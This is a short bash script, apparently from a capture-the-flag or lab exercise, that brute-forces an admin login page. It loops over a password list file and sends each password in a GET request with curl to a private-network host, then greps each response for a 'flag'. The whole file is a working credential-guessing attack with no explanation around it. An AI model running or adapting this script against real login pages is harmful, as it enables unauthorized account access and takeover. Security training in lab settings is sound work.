#!/bin/bash

while IFS= read -r line; do
	printf 'test with user[admin]:passwd:[%s]\n' "$line"
	curl "http://192.168.1.75/?page=signin&username=admin&password=$line&Login=Login" | grep "flag"
	# echo 
done < "./passwd_list.txt"